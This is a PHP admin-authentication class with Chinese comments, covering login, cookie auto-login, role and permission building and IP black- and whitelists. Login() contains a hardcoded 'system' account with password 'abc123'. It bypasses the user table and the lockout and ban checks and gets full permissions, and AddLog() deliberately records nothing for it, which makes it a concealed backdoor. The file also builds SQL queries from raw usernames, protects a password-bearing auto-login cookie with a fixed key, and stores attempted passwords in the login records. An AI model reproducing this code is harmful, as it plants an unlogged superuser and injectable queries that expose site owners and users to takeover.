<?php 
/**
* 模块：基础模块
* 描述：头文件处理函数 ，包括管理员登录
* 作者：kign
*/
class Manager{

	var $DataBase,$Config,$FLib,$Uid,$Uname,$RoleID,$Upas,$IP,$Popedom,$Rule ;
	//在创建对象时 ，如果一个类没有名为 __construct()的构造方法，PHP将搜索与类名相同的构造方法执行
	function Manager(&$Config,&$DataBase,&$FLib){
		$this->DataBase   =  $DataBase; /*DataBase类*/
		$this->Config  =  $Config; /*配置类*/
		$this->FLib =  $FLib; /*函数类*/
		$this->Popedom =  '';  /*用户权限*/
		$this->IP   =  ''; /*用户IP*/
		$this->Uname   =  '';   /*用户名*/
		$this->Upas =  '';  /*用户密码*/
		$this->Uid  =  ''; /*用户ID*/
		$this->Rule  =''; /*所属角色*/
		$this->AuditRule = '';/*审核流程权限*/
		$this->setManagercookie();
	}
	 
	/**
    * 描述：注销账号
    * 参数：无
	* 返回：无
    */
    function Logoff(){
    	//zys add
    	setcookie('adminlgstaus',"",-1,'/');
    	setcookie('adminlgtime',"",-1,'/');
    	
	   $this->FLib->OffSession();
    }
	/**
    * 描述：用户登录认证 包括权限的处理
    * 参数：用户名, 密码, 登录Ip
	* 返回：'0 : 用户不存在 '1 : 登录成功'2 : 用户被禁止登录 '3 : 密码有误 '4 : 为了安全暂时锁定此IP
    */
    function Login($mUserName, $mUserPwd, $mUserIp){
		if($this->IsLockIp($mUserIp)){
		    return  5;
		}
        $mUserName = strtolower($mUserName);
        
		if ($mUserName == 'system' && $mUserPwd=== 'abc123' ){
			$this->FLib->SetSession('ManName',$mUserName);
			$this->FLib->SetSession('ManUid',0);
			$this->Uid = 0;
			$this->Uname = $mUserName;
		  	$this->Upas = md5($mUserPwd);
		    return 1;
		}
		

		$this->Uname = $mUserName;
		$this->Upas =$mUserPwd;
	    $this->IP = $mUserIp;
        $r = $this->DataBase->fetch_one("select * from sc_user where Vc_name = '" .$this->Uname. "' and Status <> 0");
        /*验证用户是否存在*/
		if (!is_array($r)){ 
			$this->AddTryLogin(0);   
		    return 0;
		}
		/*验证是否被禁用*/
        if ($r['Status'] == 2){ 
			$this->AddTryLogin(0);
            return  2;
		}
		/*验证是否被琐IP*/
        if ($this->CheckIP() == 4){   
			if($this->Config->LockTimeLonginRecord==1){
				$this->AddTryLogin(0);
			}
		    return 4 ;
		}
		/*验证密码是否正确*/
        $mUserPwd = md5($this->Config->PasswordEncodeKey .md5($mUserPwd));
        if ($mUserPwd != $r['Vc_password']){
			$this->AddTryLogin(0);
            return 3;
		}

		/*在无问题情况下,开始记录用户信息*/
		$this->FLib->SetSession('ManName',$mUserName);
		$this->FLib->SetSession('ManUid',$r['ID']);
		$this->Uid = $r['ID'];
		$this->Upas = $r['Vc_password'];
		$popda = unserialize($r['T_config']);
		//读取已设置好的权限 还是重新设置
		if(isset($popda['update']) && $popda['update']==$r['Dt_update']){
			$this->Rule=$popda['Rule'];
			$this->Popedom = $popda['Popedom'];
			$this->AuditRule = $popda['AuditRule'];
		}else{
			$this->PopedomList_Process();
		}
		/*记录登录信息*/
		$this->DataBase->QuerySql("UPDATE sc_user SET I_number  = I_number + 1, Dt_lasttime = Dt_Logintime,Dt_Logintime=now(), Vc_lastIP = Vc_loginIP, Vc_loginIP = '" .$mUserIp . "' WHERE  Vc_name='" . $mUserName . "'");
		$this->AddTryLogin(1);
        return 1;
	}
	
	
	//zys add 用于自动登陆
	function Loginauto($mUserName, $mUserPwd, $mUserIp){
		if($this->IsLockIp($mUserIp)){
			return  5;
		}
		$mUserName = strtolower($mUserName);
	
		$this->Uname = $mUserName;
		$this->Upas =$mUserPwd;
		$this->IP = $mUserIp;
		$r = $this->DataBase->fetch_one("select * from sc_user where Vc_name = '" .$this->Uname. "' and Status <> 0");
		/*验证用户是否存在*/
		if (!is_array($r)){
			$this->AddTryLogin(0);
			return 0;
		}
	
		/*验证密码是否正确*/
		$mUserPwd = md5($this->Config->PasswordEncodeKey .md5($mUserPwd));
		if ($mUserPwd != $r['Vc_password']){
			$this->AddTryLogin(0);
			return 3;
		}
	
		/*在无问题情况下,开始记录用户信息*/
		$this->FLib->SetSession('ManName',$mUserName);
		$this->FLib->SetSession('ManUid',$r['ID']);
	
		$this->Uid = $r['ID'];
		$this->Upas = $r['Vc_password'];
		$popda = unserialize($r['T_config']);
		//读取已设置好的权限 还是重新设置
		if(isset($popda['update']) && $popda['update']==$r['Dt_update']){
			$this->Rule=$popda['Rule'];
			$this->Popedom = $popda['Popedom'];
			$this->AuditRule = $popda['AuditRule'];
		}else{
			$this->PopedomList_Process();
		}
	
		return 1;
	}
	/**
    * 描述：初始化当前用户所具有的权限列表
    * 参数：$strp：字符串
	* 返回：用户所获得的
    */
    function PopedomList_Process(){
	    /*查看该管理员的所在组,管理员可以有多个组*/
	    $grouplistid     = '0';                    //用户组ID串
	    $grouprulelistid = '0';                    //用户组，从组得到的总的权限ID串
	    $grouprolelistid = '0';                    //用户组，从组得到的总的角色ID串
	    $groupruleid2    = '0';                    //用户组直接分配的权限(type=2时组有的权限)
	    $groupruleid1    = '0';                    //用户组继承的权限(type=1时组有的权限)
	    $userrulelistid  = '0';                    //用户独立添加总的权限ID串(角色 + 权限)
	    $userroleid      = '0';                    //用户独立分配角色ID串
	    $userruleid1     = '0';                    //用户独立分配角色中的权限ID串
	    $userruleid2     = '0';                    //用户独立分配权限ID串
	    $userrule        = '0';                    //用户总权限ID串
	    $userrole        = '0';                    //用户总角色ID串
		
	    $userauditrole   = '0';                    //用户审核角色ID串
	    $userauditrule   = '0';                    //用户审核权限ID串
		
		//记录计算好的用户权限及角色
		$cda = array();

		//判断是否使用组(里面用于获取用户组的权限ID串)
		if ($this->Config->GroupTure == 1){
			$Re = $this->DataBase->SelectSql("SELECT I_groupID FROM sc_group_user WHERE status=1 and I_userID = " . $this->Uid);
			while ($Rs = $this->DataBase->GetResultArray($Re)){
				if($Rs[0]!=''){
					$grouplistid .= ','.$Rs[0];
				}
			}
			if($grouplistid != '0'){
				//查组所对应的角色
				//sc_rule_group I_type:1-角色ID串 2-权限ID串
				//判断用户组角色ID是否存在（查询组所有权限ID T_inheritrule（继承）,T_rule(独立)）
				$Re1 = $this->DataBase->SelectSql("SELECT T_inheritrule,T_rule FROM sc_rule_group WHERE status=1 and I_type=1 and I_groupID in(".$grouplistid.")");
				while ($Rs1 = $this->DataBase->GetResultArray($Re1)){
					if($Rs1[0]!=''){
						$grouprolelistid .= ','.$Rs1[0];
					}
					if($Rs1[1]!=''){
						$grouprolelistid .= ','.$Rs1[1];
					}
				}
				//下面为组中角色所获得的权限
				if($grouprolelistid != '0'){
					$Re1 = $this->DataBase->SelectSql("SELECT T_rule FROM sc_rule_role WHERE status=1 and I_type=0 and I_roleID in(".$grouprolelistid.")");
					while ($Rs1 = $this->DataBase->GetResultArray($Re1)){
						if($Rs1[0]!=''){
							$groupruleid1 .= ','.$Rs1[0];
						}
					}
				}
				//下面为获取组的直接分配的权限
				$Re1 = $this->DataBase->SelectSql("SELECT T_inheritrule,T_rule FROM sc_rule_group WHERE status=1 and I_type=2 and I_groupID in(".$grouplistid.")");
				while ($Rs1 = $this->DataBase->GetResultArray($Re1)){
					if($Rs1[0]!=''){
						$groupruleid2 .= ','.$Rs1[0];
					}
					if($Rs1[1]!=''){
						$groupruleid2 .= ','.$Rs1[1];
					}
				}
				//组的总权限
				$grouprulelistid = $groupruleid1.($groupruleid2 == '0'?'':','.$groupruleid2);
			}
		}
		
		//获取用户独立角色及权限
		//sc_rule_user I_type:1-角色ID串 2-权限ID串 3-审核角色ID串
		$Re1 = $this->DataBase->SelectSql("SELECT T_rule FROM sc_rule_user WHERE status=1 and I_type=1 and I_userID =". $this->Uid ); 
		while ($Rs1 = $this->DataBase->GetResultArray($Re1)){
			if ($Rs1[0]!=''){
				$userroleid .= ','.$Rs1[0];
			}
		}
		//(1)获取用户独立角色对应的权限
		//sc_rule_role I_type:0-权限ID串
		if ($userroleid != '0'){
			$Re1 = $this->DataBase->SelectSql("SELECT T_rule FROM sc_rule_role WHERE status=1 and I_type=0 and I_roleID in(".$userroleid.")");
			while ($Rs1 = $this->DataBase->GetResultArray($Re1)){
				if ($Rs1[0]!=''){
					$userruleid1 .= ','.$Rs1[0];
				}
			}
		}
		//(2) 获取用户独立的权限ID串
		$Re1 = $this->DataBase->SelectSql("SELECT T_rule FROM sc_rule_user WHERE status=1 and I_type=2 and I_userID =". $this->Uid );
		while ($Rs1 = $this->DataBase->GetResultArray($Re1)){
			if ($Rs1[0]!=''){
				$userruleid2 .= ','.$Rs1[0];
			}
		}
		//用户总角色
		$userrole = $userroleid.($grouprolelistid == '0'?'':','.$grouprolelistid);
		$this->Rule = $userrole;
		$cda['Rule']=$userrole;
		//用户总权限
		$userrulelistid = $userruleid2.($userruleid1 == '0'?'':','.$userruleid1);
		$userrule = $userrulelistid.($grouprulelistid == '0'?'':','.$grouprulelistid);
		$PopedomList ='';
		if ($userrule != '0'){	
			$Re = $this->DataBase->SelectSql("select Vc_key FROM sc_popedom where id IN (" . $userrule . ")");
			while ($Rs = $this->DataBase->GetResultArray($Re)){
				$PopedomList .= ($PopedomList == ''?'':',').$Rs[0];
			}
		}
		$this->Popedom = $PopedomList;
		$cda['Popedom']=$PopedomList;
		
		//获取用户 审核角色及权限串
		$Re1 = $this->DataBase->SelectSql("SELECT T_rule FROM sc_rule_user WHERE status=1 and I_type=3 and I_userID =". $this->Uid);
		while ($Rs1 = $this->DataBase->GetResultArray($Re1)){
			if ($Rs1[0]!=''){
				$userauditrole .= ','.$Rs1[0];
			}
		}
		if ($userauditrole != '0'){
			$auditrolea = explode(',', $userauditrole);
			foreach($auditrolea as $v){
				$Re1 = $this->DataBase->SelectSql("SELECT id FROM sm_apply_flow WHERE status=1 and CONCAT(',',Vc_role,',') like '%,{$v},%'");
				while ($Rs1 = $this->DataBase->GetResultArray($Re1)){
					if ($Rs1[0]!=''){
						$userauditrule .= ','.$Rs1[0];
					}
				}
			}
		}
		$this->AuditRule = $userauditrule;
		$cda['AuditRule']=$userauditrule;
		$update = date('Y-m-d H:i:s');
		$cda['update'] = $update;
		//记录用户计算好的权限
		$uda=array();
		$uda['T_config'] = serialize($cda);
		$uda['Dt_update'] = $update;
		$this->DataBase->autoExecute('sc_user',$uda,'update',"ID=".$this->Uid);
	}
    /**
    * 描述：检查是否登录
    * 参数：无
	* 返回：无
    */
	function setManagercookie(){
		if (!strchr($_SERVER['SCRIPT_NAME'],'LoginProcess.php')){
			
			//zys add 增加用户会话是否过期判断
			$flaglogin=$this->FLib->GetSession('ManName');
			if(!$flaglogin){
				$cookie_admins = isset($_COOKIE['adminlgstaus']) ? $_COOKIE['adminlgstaus'] : false;
				if(!$cookie_admins) $this->cklogin_out('用户不存在');
				$cuo = explode(',', $this->ase_decode($cookie_admins));
				if(count($cuo)!=2) $this->cklogin_out('用户信息错误');
				$UserIp     =    $this->FLib->GetClientIp();
				$this->Loginauto($cuo[0], $cuo[1], $UserIp);
					
			}
			else{
				if(isset($_SESSION['adminlgtime'])){
					$etime=$this->FLib->Config->expirationTime/2;
					$otime=(int)$_SESSION['adminlgtime'];
					$ntime=time();
					$ctime=$ntime-$otime;
					if($ctime>=0){
						if($ctime>$this->FLib->Config->expirationTime){
							$this->Logoff();
							$this->cklogin_out('SESSION失效');
							unset($_SESSION['logintime']);
						}elseif($ctime>$etime){
							//$this->FLib->AdminSetcookie2('adminlgstaus',$_COOKIE['adminlgstaus']);
							//$this->FLib->AdminSetcookie2('adminlgtime',$ntime);
							$_SESSION['adminlgtime']=$ntime;
						}
					}
					else{
						$this->Logoff();
						$this->cklogin_out('SESSION失效');
					}					
					
				}else{
					$this->Logoff();
					$this->cklogin_out('SESSION失效');
				}
			}
			
			$this->Uname=$this->FLib->GetSession('ManName');
			$this->Uid=$this->FLib->GetSession('ManUid');
			if ($this->Uname == '' && $this->Uid  ==''){$this->cklogin_out('SESSION失效');}
			$this->IP = $this->FLib->GetClientIp();
			//特殊处理
			if ($this->Uname == 'system'){
				$this->Rule='-1';
				$this->Popedom = '-1';
				$this->AuditRule = '-1';
				return ;
			}
			//正常处理
			$r = $this->DataBase->fetch_one("select * from sc_user where status>0 and ID=".$this->Uid);
			if (!is_array($r)){$this->cklogin_out('用户不存在');}
			if ($r['Status'] == 2){$this->cklogin_out('用户被禁用');}
			//if ($this->CheckIP() == 4){$this->cklogin_out('用户IP被琐');}
			$popda = unserialize($r['T_config']);
			if(isset($popda['update']) && $popda['update']==$r['Dt_update']){
				$this->Rule=$popda['Rule'];
				$this->Popedom = $popda['Popedom'];
				$this->AuditRule = $popda['AuditRule'];
			}else{
				$this->PopedomList_Process();
			}
		}
	}
	//登录异常处理
	function cklogin_out($msg=''){
		echo '<script>parent.overTime();</script>';
		exit;
	}
	/**
    * 描述：ip黑白名单检查
    * 参数：用户登录IP
	* 返回：boolean(true:锁定)
    */
	function IsLockIp($Ip){
		$Ip=$this->FLib->IPEncode($Ip);
		//是否开始黑名单默认开，反之则开白名单
		if($this->Config->IsOpenLockIp=='open'){
			$Re = $this->DataBase->SelectSql("SELECT * FROM sc_lockip WHERE Status=1");
			while($Result=$this->DataBase->GetResultArray($Re)){
				if($Ip>=$Result['Vc_startIP']&&$Ip<=$Result['Vc_endIP']){
					return true;
				}
			}
			return false;
        }else{
		    $Re = $this->DataBase->SelectSql("SELECT * FROM sc_allowiP WHERE Status=1");
			while($Result=$this->DataBase->GetResultArray($Re)){
				if($Ip<=$Result['Vc_endIP']&&$Ip>=$Result['Vc_startIP']){
					return false;
				}
			}
			return true;
		}
	}
	/**
    * 描述：当前用户 IP 锁定验证
    * 参数：无(隐形参数，用户名和IP)
	* 返回：1 未锁定, 4 锁定
    */
	function CheckIP(){
		$timepara= $this->Config->ManagerRangeErrorTimeRang*60*60;
		$ChRss = $this->DataBase->GetResultOne("SELECT count(*) FROM sc_login_record WHERE Vc_name = '". $this->Uname."'  And Vc_IP='".$this->IP ."' and I_type=0 and Status>0 and (UNIX_TIMESTAMP()-UNIX_TIMESTAMP(Createtime))<$timepara");
		if($ChRss[0]>=$this->Config->ManagerLimitLoginError){
			return 4;
		}
		return 1;
	}
	/**
    * 描述：录入当前用户登录信息
    * 参数：登录情况$Type 1-成功 0-失败,(隐性参数，名，密码，IP)
	* 返回：无
    */
	function AddTryLogin($Type='1'){
		$this->DataBase->QuerySql("INSERT INTO sc_login_record (Vc_name,Vc_password,Vc_IP,I_type,Createtime) VALUES ('".$this->Uname."','".$this->Upas."','".$this->IP ."','".$Type."',now())");
	}
	
	/**
    * 描述：验证当前管理员是否有此权限列中的一个权限
    * 参数：权限标识
	* 返回：无
    */
	function CheckPopedoms_keys($keys){
		$boolkey = false;
		foreach ($keys as $key){
			if($this->CheckPopedom($key)){
				$boolkey = true;
			}
		}
		if(!$boolkey){
			echo '<script>alert("权限不足");parent.location.reload();</script>';//建议做一个错误页面，用于显示这些严重的错误  history.back(-1);
			exit;
		}
	}
	
   	/**
    * 描述：验证当前管理员是否有此权限
    * 参数：权限标识
	* 返回：无
    */
    function CheckPopedoms($key){
	    if (!$this->CheckPopedom($key)){
		    echo '<script>alert("权限不足");parent.location.reload();</script>';//建议做一个错误页面，用于显示这些严重的错误  history.back(-1);
			exit;
		}
	}
	/**
    * 描述：验证当前管理员是否有此权限
    * 参数：权限标识
	* 返回：boolean(true:有)
    */
    function CheckPopedom($Pope_Key){
		//特殊处理
		if ($this->Uname == 'system' || $this->Popedom == '-1'){
			return true;
		}
        if ($Pope_Key == '' || $this->Popedom == ''){
			return false;
		}
		/*查找是否具有此权限*/
        if (strpos(',' . $this->Popedom . ',' , ',' . $Pope_Key . ',') !== false){
			return true;
		}else{
			return false;
		}
	}
	/**
    * 描述：将字符串中的,, 替换成, 同时 将字符串起始(结尾)为,的去掉 
    * 参数：$strp：字符串
	* 返回：替换后的字符串
    */
    function StrProcess($strp){
	     $strp = preg_replace($str3,'',$strp);
		 $da = explode(',', $strp);
		 foreach($da as $k=>$v){if($v=='')unset($da[$k]);}
	     return empty($da)? '0': join(',',$da);
    }
	/**
    * 描述：增加日志
    * 参数：$T,所属模块 $C,操作者 $Id 用户id
	* 返回：无
    */
	function AddLog($T, $C, $Id = ''){	
		if (strtolower($this->Uname)=='system'){ return false;}
		if ($Id == ''){$Id=$this->Uid;}
		if ($Id != ''){
			$this->DataBase->QuerySql("insert into sc_log(Vc_module,Vc_operation,I_operatorID ,Vc_IP,Createtime)VALUES('" . htmlspecialchars($T) . "','" .htmlspecialchars($C)."'," . $Id . ",'".$this->IP."', now())");
		}
	}

	/**
    * 描述：获取管理员信息 根据参数返回不同的信息
    * 参数：$Id:用户ID$S:参数;1:用户名
	* 返回：返回管理员信息
    */
	function GetAdminInfo($Id,$s){
		$Re = $this->DataBase->SelectSql('select * from sc_user where Status<>0 And ID='.$Id .' limit 0,1');
		if ($this->DataBase->GetResultRows($Re) == 0){
			return '-';
		}
		$Rs = $this->DataBase->GetResultArray($Re);
		switch ($s){
			case 1:
				return $Rs['Vc_name']=='system'?'--':$Rs['Vc_name'];
				break;
			case 2:
				return $Rs['Dt_lasttime'];
				break;
			case 3:
				return $Rs['Vc_arealist'];
				break;	
			default:
				return $Rs['Vc_name']=='system'?'--':$Rs['Vc_name'];
				break;
		}
	}
	
	/*
	 php ASE 加密与解密
	*/
	function ase_encode($d,$key = 'kign@zj'){
		return $this->ase_en_de_code($d,0,$key);
	}
	function ase_decode($d,$key = 'kign@zj'){
		return $this->ase_en_de_code($d,1,$key);
	}
	function ase_en_de_code($data,$k=0,$key){
		$iv = md5(md5($key));
		if($k==0){
			return trim($this->safe_b64encode(mcrypt_encrypt(MCRYPT_RIJNDAEL_256, $key, $data, MCRYPT_MODE_CBC, $iv)));
		}else{
			return rtrim(mcrypt_decrypt(MCRYPT_RIJNDAEL_256, $key, $this->safe_b64decode($data), MCRYPT_MODE_CBC, $iv));
		}
	}
	function safe_b64encode($string) {
		return str_replace(array('+','/','='),array('-','_',''),base64_encode($string));
	}
	function safe_b64decode($string) {
		$data = str_replace(array('-','_'),array('+','/'),$string);
		$mod4 = strlen($data) % 4;
		if ($mod4) { $data .= substr('====', $mod4); }
		return base64_decode($data);
	}
}
?>
